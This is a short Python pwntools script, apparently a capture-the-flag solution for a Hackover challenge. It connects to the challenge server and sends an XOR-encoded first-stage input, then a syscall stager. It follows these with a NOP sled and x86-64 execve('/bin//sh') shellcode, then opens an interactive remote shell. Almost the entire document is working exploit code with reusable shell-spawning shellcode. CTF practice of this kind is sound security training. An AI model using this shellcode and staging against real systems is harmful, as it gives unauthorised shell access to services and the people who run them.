from pwn import *
import hexdump
import time

HOST, PORT = '0.0.0.0', 6500
HOST, PORT = 'challenges.hackover.h4q.it', 47474

r = remote(HOST, PORT)

sh = "\x54\x5E\x89\xC7\x0F\x05\xFF\xE4"
target = str(bytearray([x^ord(y) for x, y in zip([179, 145, 127, 221, 98, 129, 17, 106, 144], sh)]))

execve = "j;X\x99H\xbb/bin//shRST_RWT^\x0f\x05"
stager = "\xfe\xc6\x93\x0f\x05"

r.send(target)

time.sleep(0.5)

r.send(stager)
r.send('\x90' * 100 + execve)
# r.recvall()
r.interactive()